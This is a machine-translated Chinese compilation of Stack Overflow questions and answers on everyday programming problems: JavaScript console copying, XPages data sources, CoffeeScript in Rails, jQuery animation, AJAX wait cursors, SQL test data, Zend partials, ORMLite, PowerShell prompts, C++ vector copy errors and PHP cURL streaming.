    str += $(e).html();
});
copy(str); 
```

然后粘贴到您的编辑器中。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2017-08-01T21:12:04.067

使用“存储为全局变量”有效，但它只获取对象的最终实例，而不是记录对象的那一刻（因为您可能希望在对象发生更改时比较它们）。为了在修改的确切时间点获取对象，我使用了这个......

```
function logObject(object) {
    console.info(JSON.stringify(object).replace(/,/g, ",\n"));
} 
```

就这么称呼吧……

```
logObject(puzzle); 
```

如果您的数据恰好包含逗号，您可能需要删除 .replace(/./g, ",\n") 正则表达式。

# xpages - Xpages sessionAsSigner 和 domino 数据源

> ID：10305371
> 
> 赞同：1
> 
> 时间：2012-04-24T20:16:14.340
> 
> 标签：xpages

我在一个特定的数据库中有一个公共文档，它是这样创建的：

```
<xp:dominoDocument var="newDoc" formName="frmMyForm" 
    databaseName="#{javascript:applicationScope.aspMyDBPath}">
</xp:dominoDocument> 
```

该数据库的 ACL 设置为匿名作为读者，具有对公共文档的写访问权限。我无法保存此文档，因为 Xpages 以 Web 用户身份运行。如果我作为代理签名者运行并且我使用 sessionAsSigner 初始化了数据库，我可以保存它。如何使用 dominoDocument 数据源执行此操作？有任何想法吗？

任何帮助，将不胜感激。我不想仅仅为了解决这个问题而授予对该数据库的编辑级别访问权限。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-25T03:54:24.653

您可以让无法访问数据库的用户通过这种方式创建公共文档：

1.  *使用$PublicAccess*字段（文本，值“1”）将表单添加到数据库
2.  启用表单的属性“可用于公共访问”
3.  将属性“computewithform=both”添加到您的数据源
4.  将 Xpage 的安全设置更改为“允许公共访问”
5.  更改数据库的 ACL 并允许创建和读取公共文档

这也应该适用于读者。

希望这可以帮助

斯文

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-25T15:42:26.637

It should be possible to use a dataContext for this. In the properties of the XPage setup a new DataContext and set it to the correct DB/Doc but use sessionAsSigner to return the database.

You won't have the easy access to the fields on the form for any data controls, you'd need to manually enter in the EL for each field.

# ruby-on-rails - 如何在 Rails 中包含 CoffeeScript

> ID：10305374
> 
> 赞同：2
> 
> 时间：2012-04-24T20:16:23.077
> 
> 标签：ruby-on-rails, coffeescript

那么 CoffeeScript 从 3.1 开始就与 Rails 一起发布了？极好的！我正在进入语法。我喜欢简单。

然而，我似乎无法弄清楚如何将它包含在我的网站上。我试过在两者之间包含它，但没有奏效。

我有一个我想要的 .erb 文件，new.html.erb（显然，这是一个 Rails 应用程序）：

```
<script type="text/coffeescript">
# Countdown to date script provided by JavaScriptKit.com
# http://www.javascriptkit.com/script/script2/count.shtml

montharray=new Array("Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec")

countdown(yr,m,d) ->
  today=new Date()
  todayy=today.getYear()

if (todayy < 1000)
  todayy+=1900
  todaym=today.getMonth()
  todayd=today.getDate()
  todaystring=montharray[todaym]+" "+todayd+", "+todayy
  futurestring=montharray[m-1]+" "+d+", "+yr

  difference=(Math.round((Date.parse(futurestring)-Date.parse(todaystring))/(24*60*60*1000))*1)

if (difference==0) and document.write(current)
  elseif (difference>0) document.write("ONLY "+difference+" DAYS LEFT!")

countdown(2012,4,30)

</script>​ 
```

而且它根本没有出现。想法？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-24T20:28:42.323

如果你启用了 CoffeeScript，Rails 将为`.js.coffee`你的每个控制器生成一个`app/assets/javascripts`. 这就是你的 CoffeeScript 所属的地方，你不需要包含`script`标签。

在指南中阅读更多信息：http: [//guides.rubyonrails.org/asset_pipeline.html](http://guides.rubyonrails.org/asset_pipeline.html)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-04-24T21:01:10.060

这不是一个好的做法，但您可以选择使用基于 js 的咖啡脚本编译器在客户端评估咖啡脚本。检查[官方指南](http://coffeescript.org/#scripts)。

# jquery - .animate() 行为怪异（重复动画）（jQuery）

> ID：10305381
> 
> 赞同：1
> 
> 时间：2012-04-24T20:17:26.463
> 
> 标签：jquery, jquery-animate, repeat

如果您访问[http://ngmat.site90.net/](http://ngmat.site90.net/)并将鼠标悬停在左上角带有文本的小黑框上，它应该放大以显示所有文本。它正是我现在想要的，但它以一种非常奇怪的方式做到了。有时它会一遍又一遍地重复动画，我想你必须自己看到它，因为我不知道它为什么会这样做。

编辑：如果高度设置为“自动”，我使用了我想出的一个小技巧来获取 div 的高度，这可能是问题吗？

这是JavaScript

```
$(document).ready(function(){
    var idagHeight = parseInt($("#idag").css('height'));
    var idagWidth = parseInt($("#idag").css('width'));
    var idagPopUpLeft = parseInt($("#idagPopUp").css('left'));

    $("#idag").css({"height": "auto", "width": idagWidth+30});
    var idagTempHeight = $("#idag").height();
    $("#idag").removeAttr("style");

    $("#idag").mouseover(function(){
        $(this).animate({height: idagTempHeight, width: idagWidth+30}, 300);
        $("#idagPopUp").animate({left: idagPopUpLeft+30}, 300);
    });
    $("#idag").mouseout(function(){
        $(this).animate({height: idagHeight, width: idagWidth}, 300, function(){$("#idag").removeAttr("style");});
        $("#idagPopUp").animate({left: idagPopUpLeft}, 300);
    });
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:28:30.823

当您将孩子悬停在#idag 内时，会触发 mouseout 事件。对 div 进行动画处理是将鼠标从子项中移出，因此会再次触发 mouseover 事件。您可以使用

```
e.cancelBubble = true;
if (e.stopPropagation) e.stopPropagation(); 
```

在您的处理程序内部。

在 .animate() 之前调用 .stop() 也是一个很好的做法，以防止动画排长队。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:30:00.173

您可以改用它：

```
$(document).ready(function(){
    var idagHeight = parseInt($("#idag").css('height'));
    var idagWidth = parseInt($("#idag").css('width'));
    var idagPopUpLeft = parseInt($("#idagPopUp").css('left'));

    $("#idag").hover(function(){
        $(this).stop().animate({height: "+=30", width: "+=30"}, 300);
        $("#idagPopUp").stop().animate({left: "+=30"}, 300);
    }, function(){
        $(this).stop().animate({height: idagHeight, width: idagWidth}, 300);
        $("#idagPopUp").stop().animate({left: idagPopUpLeft}, 300);
    });
}); 
```

或者，如果您不知道最终的块高度，您可以将第一个动画函数更改为：

```
$(this).stop().animate({width: "+=30"}, 300, function() {
    $(this).css("height", "auto");
}); 
```

# javascript - Javascript 两个等于

> ID：10305387
> 
> 赞同：0
> 
> 时间：2012-04-24T20:17:58.613
> 
> 标签：javascript

试图加深我对 JS 的了解，有人可以告诉我这是做什么的吗？

```
jQuery = $ = this.jQuery; 
```

两个等号在这里究竟做了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:19:41.627

分配`this.jQuery`给`$`，然后分配`$`给`jQuery`。

这是有效的，因为在分配一个值时，它返回它刚刚分配的值，因此可以为它设置另一个变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:19:26.903

将 this.jQuery 分配给 $ 和 jQuery

为什么不试试呢？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:22:19.117

如您所知，它只是“堆叠”等号；）

您的示例可以重写为

```
$ = this.jQuery;
jQuery = $; 
```

即变量“jQuery”和“$”都设置为右边的值。（因此它节省了空间，并且可能更清楚地将两个 var 设置为相同的值。

# ruby-on-rails - Rails 3.2 限制 URL 的长度

> ID：10305388
> 
> 赞同：0
> 
> 时间：2012-04-24T20:18:01.937
> 
> 标签：ruby-on-rails, query-parameters

Rails 应用程序中的 url 长度是否有限制？我有一堆要附加到 URL 的查询参数，并且在某些时候，我只是`!! Invalid request`在日志中得到一个错误。当我尝试将 400 个整数作为查询参数附加时，会出现此错误。

如果有限制，有没有办法绕过它，还是我需要切换到`Post`方法？

**编辑**

是否存在可能低于 HTTP 标准的 Rails 特定限制？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:39:51.550

我无法从您的问题中判断您是否遇到了浏览器的限制，或者通过特定的 Web 服务器，但这可能有它的限制。我不知道 Rails 是否有限制，但 apache httpd 有。

[http://www.boutell.com/newfaq/misc/urllength.html](http://www.boutell.com/newfaq/misc/urllength.html)

# javascript - 将光标设置为等待的最简单方法，然后让所有元素恢复

> ID：10305392
> 
> 赞同：21
> 
> 时间：2012-04-24T20:18:27.613
> 
> 标签：javascript, jquery, css

在我的网站中，我有一些 CSS 类，当您将鼠标悬停在它们上时，它们会设置固定类型的光标。当我在页面上的任何位置进行 AJAX 调用时，我想将光标设置为等待图像，然后在 AJAX 调用完成后让它恢复到它应该是的任何光标。

我试过：

```
$(document).ajaxStart(function () {
    document.body.style.cursor = 'wait';
});

$(document).ajaxStop(function () {
    document.body.style.cursor = 'auto';
}); 
```

当我的鼠标悬停在具有更改光标的 CSS 类的 DOM 对象上时，这不起作用，我不知道如何使它这样做。

目前我有一堂课：

```
.pills a:hover
{
    background-color: #0069D6;
    color: #FFFFFF;
    text-shadow: 0 1px 1px rgba(0, 0, 0, 0.25);
    text-decoration:none;
    cursor:pointer;
} 
```

如果您将鼠标悬停在此类中的对象上，并且开始了 Ajax 调用，则光标仍然作为指针停留。

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-04-24T20:30:06.760

您可以使用在`body`和上切换类的组合`!important`。

[http://jsfiddle.net/UGwmv/2/](http://jsfiddle.net/UGwmv/2/)

```
$("button").click(function(){
   $("body").toggleClass("wait");
   return false; 
}); 
```

```
body.wait, body.wait *{
    cursor: wait !important;   
} 
```

当 body 有`wait`类时，一切都会显示等待光标。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T20:27:35.760

如果您有包装器或容器：

```
<script type="text/javascript">
$(document).ajaxStart(function () {
    document.body.style.cursor = 'wait';
    $('div#wrapper').addClass('wait');
});

$(document).ajaxStop(function () {
    document.body.style.cursor = 'auto';
    $('div#wrapper').removeClass('wait');
});
</script>

<style type="text/css">
    div#wrapper.wait * {
        cursor: wait !important;
    }
</style> 
```

基本上，包装器的所有孩子都会得到`cursor: wait`条件`!important`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-19T22:06:02.247

2014年的另一个答案：

解决方案如果您至少有一个样式表，请更改它！

更改 CSS 样式表：

```
sh = document.styleSheets[0]
Wait_a_bit="* {cursor: wait !important}"
sh.insertRule(Wait_a_bit, 0) 
```

在您的 ajax 之前，然后将其删除：

```
sh.deleteRule(0) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-04-23T22:43:37.567

1.  `div#wait-overlay`向您的页面添加一个空元素。我建议您将其添加到 html 文档的末尾，就在结束`<body>`元素之前。

2.  像这样设置这个元素的样式（这`.active`是故意的）：

    ```
    div#wait-overlay.active
    {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        cursor: wait;
        z-index: 100000;
        background: black;
        opacity: 0;
    } 
    ```

3.  然后添加以下javascript：

    ```
    $(document).ajaxStart(function () {
        $('#wait-overlay')
            .addClass('active')
            .animate({opacity: 0.6});
    });

    $(document).ajaxStop(function () {
        $('#wait-overlay')
        .animate(
            {
                opacity: 0
            },
            400,
            function () { $(this).removeClass('active'); }
        );
    }); 
    ```

**解释：**

1.  是空的`div#wait-overlay`div，因此它是不可见的，并且因为它位于页面的末尾，所以它不会影响任何东西。

2.  但是，如果我们`active`向这个 div 添加类，它会延伸到整个页面，并且由于非常高地`z-index`覆盖了页面上的所有内容。这样做的额外好处是页面上的所有内容都变得不可点击。

3.  javascript`.active`在 ajax 启动时自动添加类，并在 ajax 完成时将其删除。也感谢调用`animate`，页面在 ajax 启动时逐渐变暗，当 ajax 完成时，它恢复正常。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T20:27:46.143

问题是该类将覆盖光标的文档值，为避免这种情况，您应该确保悬停时的所有元素都会显示等待符号。

你最好的办法是在你想要鼠标的等待符号时向 body 元素添加一个类，这样当该类存在时，你可以从 CSS 中设置所有其他类以显示等待符号。

当 ajax 完成后，从 body 标签中删除类，具有各种光标样式的原始元素类将被恢复。

```
$(document).ajaxStart(function () {
    $('body').addClass('wait');
});

$(document).ajaxStop(function () {
    $('body').removeClass('wait');
});

<style type="text/css">
    body.wait .move {
        cursor: wait;
    }
</style> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-07-12T07:55:12.010

```
 $(document).ajaxStart(function () {
        $('*').css('cursor', 'wait');
    });

    $(document).ajaxStop(function () {
        $('*').css('cursor', '');
    }); 
```

成功了。

# sql - 如何为“按其他行的数据分组”算法生成测试数据

> ID：10305396
> 
> 赞同：5
> 
> 时间：2012-04-24T20:18:45.090
> 
> 标签：sql, algorithm, testing, greatest-n-per-group, data-generation

***更新：**我正在寻找一种技术来计算我的算法（或任意算法）的所有边缘情况的数据。**到目前为止**
， 我尝试的只是考虑可能是边缘情况+产生一些“随机”数据，但我不知道如何才能更确定我没有错过真正用户能够搞砸的东西..*

 **我想检查一下我的算法中没有遗漏一些重要的东西，而且我不知道如何生成测试数据来涵盖所有可能的情况：

**任务**是报告每个数据的快照，`Event_Date`但为可能属于*下一个`Event_Date`*的编辑创建单独的行- 请参阅第 2 组）输入和输出**数据插图**：

![输入输出数据说明](../Images/00702a9f35e6bc8b29218a16c93eaf89.png)

我的**算法**：

1.  列出s 并为它们`event_date`计算s`next_event_date`
2.  将结果加入`main_audit_table`并计算`transaction_id`每个快照的最大值（我的插图中的第 1-4 组） -根据是否为真`id`，由 和 2 个选项分组`event_date``transaction_date < next_event_date`
3.  加入`main_audit_table`结果以从同一结果中获取其他数据`transaction_id`
4.  加入`costs_audit_table`结果 - 使用`transaction_id`小于`transaction_id`结果的最大值

我的**问题**：

*   我如何生成涵盖所有可能场景的测试数据，所以我知道我的算法是正确的？
*   你能看出我的算法逻辑有什么错误吗？
*   这类问题有更好的论坛吗？

我的**代码**（需要测试）：

```
select
    snapshots.id,
    snapshots.event_date,
    main.event,
    main.transaction_date as last_change,
    costs.costs as costs_2012
  from (
    --snapshots that return correct transaction ids grouped by event_date
    select
      main_grp.id,
      main_grp.event_date,
      max(main_grp.transaction_id) main_transaction_id,
      max(costs_grp.transaction_id) costs_transaction_id
    from main_audit_table main_grp
    join (
      --list of all event_dates and their next_event_dates
      select
        id,
        event_date,
        coalesce(lead(event_date) over (partition by id order by event_date),
                 '1.1.2099') next_event_date
      from main_audit_table
      group by main_grp.id, main_grp.event_date
    ) list on list.id = main_grp.id and list.event_date = main_grp.event_date
    left join costs_audit_table costs_grp
      on costs_grp.id = main_grp.id and
         costs_grp.year = 2012 and
         costs_grp.transaction_id <= main_grp.transaction_id
    group by
      main_grp.id,
      main_grp.event_date,
      case when main_grp.transaction_date < list.next_event_date
           then 1
           else 0 end
  ) snapshots
  join main_audit_table main
    on main.id = snapshots.id and
       main.transaction_id = snapshots.main_transaction_id
  left join costs_audit_table costs
    on costs.id = snapshots.id and
       costs.transaction_id = snapshots.costs_transaction_id 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-25T20:51:21.933

公用表表达式 (CTE) 不仅是一种隐藏复杂性和减少重复较长 SQL 片段的好方法，而且还是一种简单的方法来表示测试数据，就好像它来自永久表一样。至少，CTE 会将查询的主要组件集中在顶部，从而允许您在语句的其余部分通过它们的标签来引用它们。Graeme Birchall 的[DB2 SQL Cookbook](http://mysite.verizon.net/Graeme_Birchall/id1.html)（一本维护良好的免费电子书）有一些关于这种模式和其他高级 SQL 模式的很好的例子。Joe Celko 是另一个关于如何使 SQL 为您完成更多繁重工作的想法的好来源。**

# php - 如何将数据从插件传递到 Zend 框架中的部分？

> ID：10305399
> 
> 赞同：0
> 
> 时间：2012-04-24T20:18:55.010
> 
> 标签：php, zend-framework, plugins, partial

Zend 框架有问题。我创建了一个从数据库请求一些数据的插件。

```
<?php
class Blog_Plugin_Navigation extends Zend_Controller_Plugin_Abstract {
    public function routeShutdown(Zend_Controller_Request_Abstract $request) {
        $navigation = new Application_Model_NavigationMapper();

        $view = Zend_Layout::getMvcInstance()->getView();
        $view->navigation = $navigation->fetchAll();
    }
} 
```

在我的 layout.phtml 中，我使用了这个：

```
<ul>
    <?=$this->partialLoop('navigation-item.phtml', $this->navigation)?>
</ul> 
```

当我使用 print_r 打印出数组时，我从数据库中获取值，但是如果我访问我的网站，我就没有得到任何值。导航项.phtml 看起来像这样：

```
<li><a href="<?=$this->url?>"><?=$this->text?></a></li> 
```

我只是得到这个：

```
<li><a href=""></a></li> 
```

我的错误在哪里？如果有人可以帮助我，那就太好了。：） 提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T03:57:30.873

替换

```
<?=$this->partialLoop('navigation-item.phtml', $this->navigation)?> 
```

和

```
<?=$this->partialLoop('navigation-item.phtml', $this->navigation)->setObjectKey('model')?> 
```

然后更换

```
<li><a href="<?=$this->url?>"><?=$this->text?></a></li> 
```

和

```
<li><a href="<?=$this->model->url?>"><?=$this->model->text?></a></li> 
```

# android - ORMLite - CallBatchTasks() 单独或一次用于所有更新？

> ID：10305401
> 
> 赞同：8
> 
> 时间：2012-04-24T20:19:04.340
> 
> 标签：android, ormlite

我在 Android 上使用 ORMLite，并且有 7 个表，我需要在其中创建/更新多个条目。

我目前正在我的`callBatchTasks()`每个 dao 上单独使用该方法来执行此操作，但我想知道仅使用一个 dao`callBatchTasks()`来处理所有更新是否可能/有益？

这会加快进程吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-24T20:23:34.093

有趣的问题。使用Android 下的[ORMLite](http://ormlite.com/)，所有的 DAO 都使用相同的连接到同一个数据库。因此，虽然它看起来有点粗糙，但您当然可以使用一次`fooDao.callBatchTasks()`调用来更新`Foo`、、`Bar`和`Baz`表格。这将禁用连接上的自动提交，将您想要的任何创建/更新调用应用于任何表，然后在最后提交所有更改。

# powershell - Powershell - 在输入时捕获取消

> ID：10305404
> 
> 赞同：1
> 
> 时间：2012-04-24T20:19:05.320
> 
> 标签：powershell, prompt, choice

我有一个返回选定值的函数，除非提示关闭。功能是：

```
function Read-Choice {
#.Synopsis
#  Prompt the user for a choice, and return the (0-based) index of the selected item
#.Parameter Message
#  The question to ask
#.Parameter Choices
#  An array of strings representing the "menu" items, with optional ampersands (&) in them to mark (unique) characters to be used to select each item
#.Parameter DefaultChoice
#  The (0-based) index of the menu item to select by default (defaults to zero).
#.Parameter Title
#  An additional caption that can be displayed (usually above the Message) as part of the prompt
#.Example
#  Read-Choice "WEBPAGE BUILDER MENU"  "Create Webpage","View HTML code","Publish Webpage","Remove Webpage","E&xit"
PARAM([string]$message, [string[]]$choices, [int]$defaultChoice=0, [string]$Title=$null )
   if($choices[0].IndexOf('&') -lt 0) {
      $i = 0; 
      $choices = $choices | ForEach-Object {
         if($_ -notmatch '&.') { "&$i $_" } else { $_ }
         $i++
      }
   }
   $Host.UI.PromptForChoice( $Title, $message, [Management.Automation.Host.ChoiceDescription[]]$choices, $defaultChoice )
} 
```

我这样称呼它：

```
$SetDeletes = read-choice "Delete Files" "Recycle","Kill","E&xit" 0 $message 
```

提示用户选择 0 Recycle、1 Kill 或 Exit。如果选择了这三个中的一个并且用户点击了 OK，它将返回选择的任何值（0,1 或 2）。但是，如果提示已关闭，或者用户点击取消，脚本将中止并显示如下消息：

> 使用“4”参数调用“PromptForChoice”的异常：“发生了“System.Management.Automation.Host.PromptingException”类型的错误。”

提示符上的Cancel键如何被捕获和处理？如果没有选择，我想默认为 0 值， - 回收并继续。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:50:43.873

我不能在 V3 上重现这个，这对 V3 用户来说很好，但在 V2 的情况下，你有没有尝试在 PromptForChoice 调用周围放置一个 try/catch：

```
try {
    $Host.UI.PromptForChoice($Title, $message, $choices, $defaultChoice)
}
catch [Management.Automation.Host.PromptingException] {
    $defaultChoice
} 
```

# c++ - 编译器返回“这里首先需要的综合方法 'operator='”

> ID：10305407
> 
> 赞同：6
> 
> 时间：2012-04-24T20:19:18.770
> 
> 标签：c++, gcc

我知道这可能是一个简单的问题，但在过去的一个半小时里我一直在研究它，我真的很迷茫。

这里是编译器错误：

```
synthesized method ‘File& File::operator=(const File&)’ first required here 
```

我有这段代码：

```
void FileManager::InitManager()
{
    int numberOfFile = Settings::GetSettings()->NumberOfFile() + 1;

    for( unsigned int i = 1; i < numberOfFile; i++ )
    {
        std::string path = "data/data" ;
        path += i;
        path += ".ndb";

        File tempFile( path );

        _files.push_back( tempFile ); // line that cause the error

        /*if( PRINT_LOAD )
        {
            std::cout << "Adding file " << path << std::endl;
        }*/
    }
} 
```

_files 如果在此标头中定义：

```
#pragma once

//C++ Header
#include <vector>

//C Header

//local header
#include "file.h"

class FileManager
{
public:
    static FileManager* GetManager();
    ~FileManager();

    void LoadAllTitle();

private:
    FileManager();
    static FileManager* _fileManager;

    std::vector<File> _files;
}; 
```

File是我创建的一个对象，无非就是一个简单的处理文件IO的接口。我过去已经完成了用户定义对象的矢量，但这是我第一次收到此错误。

这是 File 对象的代码：File.h

```
#pragma once

//C++ Header
#include <fstream>
#include <vector>
#include <string>

//C Header

//local header

class File
{
public:
    File();
    File( std::string path );
    ~File();

    std::string ReadTitle();

    void ReadContent();
    std::vector<std::string> GetContent();

private:
    std::ifstream _input;
    std::ofstream _output;

    char _IO;
    std::string _path;
    std::vector<std::string> _content;
}; 
```

文件.cpp

```
#include "file.h"

File::File()
    : _path( "data/default.ndb" )
{
}

File::File( std::string path )
    : _path( path )
{
}

File::~File()
{
}

void File::ReadContent()
{
}

std::string File::ReadTitle()
{
    _input.open( _path.c_str() );
    std::string title = "";

    while( !_input.eof() )
    {
        std::string buffer;
        getline( _input, buffer );

        if( buffer.substr( 0, 5 ) == "title" )
        {
            title = buffer.substr( 6 ); // 5 + 1 = 6... since we want to skip the '=' in the ndb
        }
    }

    _input.close();
    return( title );
}

std::vector<std::string> File::GetContent()
{
    return( _content );
} 
```

我正在使用 gcc 在 linux 下工作。

任何有关解决方案的提示或技巧都值得赞赏。

对不起，很长的帖子。

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-24T20:25:58.873

在 C++03 中，`std::vector<T>`要求它`T`是可复制构造和可复制分配的。`File`包含标准流数据成员，标准流是不可复制的，因此`File`也是如此。

您的代码在 C++11 中可以正常工作（使用移动构造/移动分配），但您需要避免将标准流对象按值保存为 C++03 中的数据成员。我建议将您的编译器升级到支持 C++11 移动语义的编译器或使用[Boost 的智能指针](http://www.boost.org/libs/smart_ptr/)之一。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:25:32.527

我不确定错误消息，但是这一行：

```
_files.push_back( tempFile ); 
```

要求`File`具有公共复制构造函数。由于您提供了其他构造函数，因此您还必须提供这个构造函数。编译器不会合成它。

# python - 非布尔搜索查询的嗖嗖声

> ID：10305409
> 
> 赞同：0
> 
> 时间：2012-04-24T20:19:20.267
> 
> 标签：python, search, information-retrieval, whoosh, tf-idf

我正在构建一个问答系统，为了加快进程，我希望 IR 系统从可能包含该问题答案的语料库中返回一组文档（我的 NLP 算法将尝试从全文）。

由于我使用的是 Python，因此 Whoosh 似乎是一个不错的选择，但我很难用纯布尔查询以外的方法进行搜索，这些方法不适合问答。我想要一个与字符串查询具有高 TF-IDF 相似性的文档列表。

我想输入：

> “谁是美国总统？”

并获得最相似的文档，但我只是去掉了停用词：

> “总统或美国或美国”

准确性不适用于 QA 流程。谁能指出一些方法或高级 API 方法以非布尔方式获取顶级文档？我愿意尝试其他库，但大多数库似乎很难与 Python 快速交互，我希望有一些超级简单的东西，这样我就可以继续专注于自然语言组件。

# javascript - Symfony2：Twig 检测 noscript

> ID：10305410
> 
> 赞同：0
> 
> 时间：2012-04-24T20:19:24.867
> 
> 标签：javascript, symfony, twig, detect

我想呈现一个包含所有实体数据的表。

应该有一个 noscript 版本，它额外呈现两个带有编辑和删除操作的列，以及一个默认的 javascript 版本，它可以通过侧边栏动态解决。

有没有办法让这个决定去树枝？这样树枝会检测是否支持 javascript，如果不支持则呈现附加字段？

问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:24:53.793

树枝特定的代码？不

HTML 代码？是的

您可以使用`<noscript>...</noscript>`标签向不支持 JavaScript 的浏览器显示某些内容。

或者，您可以向所有人显示另外两个列并使用 JavaScript 隐藏它们。这样，没有 JavaScript 的人会看到它们，而使用 JavaScript 的人则看不到。

# c++ - 什么是 C++ 中的非委托构造函数

> ID：10305416
> 
> 赞同：1
> 
> 时间：2012-04-24T20:19:40.923
> 
> 标签：c++, constructor

有人可以告诉我`What is a non-delegating constructor`吗？

我试图用谷歌搜索，但找不到任何有用的东西

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T20:27:20.297

这意味着构造函数不委托。（除非您在构造函数之间进行了一些调用，否则就是这种情况）。

构造函数委托在当今其他和较新的语言中非常普遍，这意味着构造函数正在调用另一个构造函数以防止代码重复并保持代码干净。

这是构造函数委托的简单教程：

[http://www.learncpp.com/cpp-tutorial/b-5-delegating-constructors/](http://www.learncpp.com/cpp-tutorial/b-5-delegating-constructors/)

# xcode4.3 - 在 xcode 4.3.2 中使用未声明的标识符

> ID：10305423
> 
> 赞同：0
> 
> 时间：2012-04-24T20:20:02.560
> 
> 标签：xcode4.3

所以回到 xcode 4.2 我对以下代码没有任何问题：

```
- (void)dealloc {
[super dealloc];
retval = UIApplicationMain(argc, argv, nil, @"AppDelegate");} 
```

但是，当我更新到 xcode 4.3.2 时，我收到错误，即 retval 和 argc 是未声明的标识符。我知道显而易见的答案是声明这两个标识符，但我不明白为什么我在 4.2 中不必这样做。

任何帮助表示赞赏，阿山

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T05:29:41.563

我想这可能是因为你有自动引用计数

# facebook - 简单的 Facebook 应用程序，没有权限但添加滥用保护/用户跟踪？

> ID：10305427
> 
> 赞同：2
> 
> 时间：2012-04-24T20:20:27.800
> 
> 标签：facebook, permissions

好的，所以我正在开发我的第一个 facebook 应用程序，它是一个非常简单的投票系统，所有内容都将在我的数据库和 facebook 上使用 iframe。我不需要访问用户信息或为他们发布到墙上或类似的东西。但是，我确实需要跟踪用户以防止他们滥用投票系统。我不确定，但我可以从用户那里存储一个唯一标识符而无需请求权限吗？IE。用户令牌，或 id 或我们

我阅读了 facebook 权限的基本信息部分，但我不明白这是在没有权限请求的情况下还是在权限请求提示之后给出的数据。

[https://developers.facebook.com/docs/authentication/permissions/](https://developers.facebook.com/docs/authentication/permissions/) （基本信息部分）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-19T14:46:15.600

好的，这些答案没有帮助。因此，通过反复试验，我们发现即使是 facebook 用户 ID 等基本信息以及任何其他唯一数据，如果不向用户发送权限请求以接受应用程序，都无法以任何方式访问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:26:02.433

当您像您所说的那样设置您的应用程序并且用户使用您的应用程序时，您将能够访问他们的 id 和其他一些东西，但 id 就是您所需要的。所以它的数据未经许可。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:38:54.933

我建议访问他们的用户 ID 并将其用作数据库中的跟踪方法。

# c++ - 如何从使用 ::dlopen 打开的库中获取 linux 中动态加载的库的名称？

> ID：10305428
> 
> 赞同：0
> 
> 时间：2012-04-24T20:20:32.687
> 
> 标签：c++, linux, dynamic, shared-libraries

在 Windows 中可以使用 GetModuleFileName。linux呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:42:23.003

dladdr() 是一个非标准（不是 POSIX 的一部分）函数，适用于大多数 Linux 机器和 OSX。由于它是非标准的，因此无法保证，但既然您指定了 Linux，它就应该存在。

# javascript - php/js 从 js 表单发布数据

> ID：10305429
> 
> 赞同：0
> 
> 时间：2012-04-24T20:20:37.853
> 
> 标签：javascript, forms, post, textarea

我正在使用允许用户从下拉列表中选择项目并将其移动到文本区域框中的 javascript。完成后，我想将他们的选择发布到服务器。问题是 javascript 写入的文本区域本身就是一个表单。由于我的理解是一个表单不能嵌套在另一个表单中，我不确定如何获取所选数据以发布它。任何建议都非常感谢。这是代码：

```
<html>
<head>
<script type="text/JavaScript">
function showText(){
var F, opt;
F = document.oForm;
opt = F.oSel.options;
if (F.oTxt.value!="")
F.oTxt.value += '\n';
F.oTxt.value += opt[opt.selectedIndex].text;
}

</script>
</head>
<body>
<form name="oForm">
<select name="oSel" size="3"
onchange="showText()">
<option>item1</option>
<option>item2</option>
<option>item3</option>
<option>item4</option>
</select>
<textarea name="oTxt" cols=24 rows=4>
</textarea>
</form>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T22:09:59.873

给 textarea 一个 id( `<textarea id="oTxt" ..>`) 然后使用`document.getElementById('oTxt')`.

或者，您可能想要检查 select multiple（将`multiple`属性添加到您的`<select>`标签），它已经为您正在做的事情而设计。

# php - 使用 curl 和 php 保持与管道的活动连接

> ID：10305434
> 
> 赞同：1
> 
> 时间：2012-04-24T20:21:12.090
> 
> 标签：php, curl

我正在使用 cURL 连接到由 Gnip 公司管理的服务器。(www.gnip.com) 最终我们希望无限期地使用管道 json 提要。

最初，当我设置我们的软件时，编写了一个很好的小类来维护连接；它是通过 gnip 从社交网络提供的。

Gnip 改变了他们要求完成连接的方式，因此课程中断了。

我可以很好地连接到服务器。有时它会保持打开状态数天，有时连接会在几秒钟内断开。

一切应该工作的方式是：我连接到 gnip 并保持一个开放的连接。gnip 将数据作为 json 字符串实时发送给我（当他们收到时）。如果在 30 秒内没有发送任何数据，他们会发送一个“保持活动”信号，让我的脚本知道它仍然处于连接状态。

理想情况下，脚本只会在两台服务器之一关闭时断开连接。我已经通过 cronjob 处理了这个问题。

